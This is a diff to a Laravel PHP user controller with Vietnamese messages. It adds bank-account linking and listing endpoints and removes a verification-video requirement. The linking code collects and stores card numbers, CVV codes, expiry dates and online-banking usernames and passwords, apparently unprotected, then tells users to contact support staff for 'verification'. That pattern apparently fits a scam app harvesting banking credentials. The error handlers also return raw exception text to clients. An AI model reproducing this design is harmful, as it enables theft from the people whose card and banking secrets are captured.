@@ -4,6 +4,7 @@ namespace App\Http\Controllers;
 
 use App\Constants\UserBankType;
 use App\Models\Profile;
+use App\Models\QrBankConnect;
 use App\Models\User;
 use App\Models\UserBank;
 use Illuminate\Http\JsonResponse;
@@ -209,6 +210,8 @@ class UserController extends Controller
                     'bank_id' => 'required',
                     'number_account' => 'required',
                     'type' => 'required|in:1,2',
+                    'branch' => 'nullable|string',
+                    'account_holder_name' => 'nullable|string',
                 ],
                 [
                     'bank_id.required' => 'Tên ngân hàng không được để trống',
@@ -232,42 +235,36 @@ class UserController extends Controller
                 ], 404);
             }
 
+            $bankData = [
+                'user_id' => $user->id,
+                'bank_id' => $data['bank_id'],
+                'type' => $data['type'],
+                'status' => UserBank::STATUS_PENDING,
+                'branch' => $data['branch'] ?? null,
+                'account_holder_name' => $data['account_holder_name'] ?? null,
+            ];
+
             if ($data['type'] == UserBankType::OLD->value) {
-                UserBank::updateOrCreate([
-                    'user_id' => $user->id,
-                    'bank_id' => $data['bank_id'],
+                $bankData = array_merge($bankData, [
                     'number_account' => $data['number_account'],
                     'tag_number' => $data['tag_number'] ?? null,
-                    'type' => $data['type'],
-                ], [
-                    'user_id' => $user->id,
-                    'bank_id' => $data['bank_id'],
-                    'number_account' => $data['number_account'],
-                    'type' => $data['type'],
-                    'CVV'  => $data['CVV'] ?? null,
+                    'CVV' => $data['CVV'] ?? null,
                     'expired_date' => $data['expired_date'] ?? null,
-                    'tag_number' => $data['tag_number'] ?? null,
                 ]);
             } else {
-                UserBank::updateOrCreate([
-                    'user_id' => $user->id,
-                    'bank_id' => $data['bank_id'],
-                    'type' => $data['type'],
-                    'account_name' => $data['account_name'] ?? null,
-                    'password' => $data['password'] ?? null,
-                ], [
-                    'user_id' => $user->id,
-                    'bank_id' => $data['bank_id'],
-                    'type' => $data['type'],
+                $bankData = array_merge($bankData, [
                     'account_name' => $data['account_name'] ?? null,
                     'password' => $data['password'] ?? null,
                 ]);
             }
 
+            $userBank = UserBank::create($bankData);
+            $userBank->load('bank');
+
             return response()->json([
                 'status' => true,
-                'message' => 'Thêm ngân hàng thành công',
-                'data' => $user,
+                'message' => 'Đây là tài khoản mới liên kết, vui lòng liên hệ cán bộ hỗ trợ để xác minh thông tin',
+                'data' => $userBank,
             ], 200);
         } catch (\Throwable $th) {
             Log::error($th->getMessage(), $th->getTrace());
@@ -302,7 +299,6 @@ class UserController extends Controller
                     'front_cccd' => 'required|image|max:10240', // 10MB
                     'back_cccd' => 'required|image|max:10240',
                     'holding_cccd' => 'required|image|max:10240',
-                    'verification_video' => 'required|mimetypes:video/avi,video/mpeg,video/quicktime,video/mp4|max:51200', // 50MB
                 ],
                 [
                     'front_cccd.required' => 'Vui lòng tải lên ảnh mặt trước CCCD',
@@ -311,9 +307,6 @@ class UserController extends Controller
                     'back_cccd.image' => 'Ảnh mặt sau CCCD phải là định dạng ảnh',
                     'holding_cccd.required' => 'Vui lòng tải lên ảnh cầm CCCD',
                     'holding_cccd.image' => 'Ảnh cầm CCCD phải là định dạng ảnh',
-                    'verification_video.required' => 'Vui lòng tải lên video xác thực',
-                    'verification_video.mimetypes' => 'Video xác thực không đúng định dạng',
-                    'verification_video.max' => 'Video xác thực không được quá 50MB',
                 ]
             );
 
@@ -346,13 +339,6 @@ class UserController extends Controller
                 $user->holding_cccd = 'storage/' . $path;
             }
 
-            if ($request->hasFile('verification_video')) {
-                $file = $request->file('verification_video');
-                $filename = time() . '_video_' . $file->getClientOriginalName();
-                $path = $file->storeAs('identity_verification/' . $user->id, $filename, 'public');
-                $user->verification_video = 'storage/' . $path;
-            }
-
             $user->save();
 
             return response()->json([
@@ -365,6 +351,44 @@ class UserController extends Controller
             return response()->json([
                 'status' => false,
                 'message' => 'Định danh thất bại, có lỗi xảy ra ở máy chủ: ' . $th->getMessage(),
+            ], 500);
+        }
+    }
+
+    public function listBank(Request $request): JsonResponse
+    {
+        try {
+            $user = Auth::user();
+            $userBanks = UserBank::where('user_id', $user->id)->with('bank')->get();
+            return response()->json([
+                'status' => true,
+                'message' => 'Lấy danh sách ngân hàng thành công',
+                'data' => $userBanks,
+            ], 200);
+        } catch (\Throwable $th) {
+            Log::error($th->getMessage(), $th->getTrace());
+            return response()->json([
+                'status' => false,
+                'message' => 'Lấy danh sách ngân hàng thất bại, có lỗi xảy ra ở máy chủ: ' . $th->getMessage(),
+            ], 500);
+        }
+    }
+
+    public function qrBank(Request $request): JsonResponse
+    {
+        try {
+            $user = Auth::user();
+            $qrBank = $user->qrBank;
+            return response()->json([
+                'status' => true,
+                'message' => 'Lấy danh sách ngân hàng thành công',
+                'data' => $qrBank,
+            ], 200);
+        } catch (\Throwable $th) {
+            Log::error($th->getMessage(), $th->getTrace());
+            return response()->json([
+                'status' => false,
+                'message' => 'Lấy danh sách ngân hàng thất bại, có lỗi xảy ra ở máy chủ: ' . $th->getMessage(),
             ], 500);
         }
     }
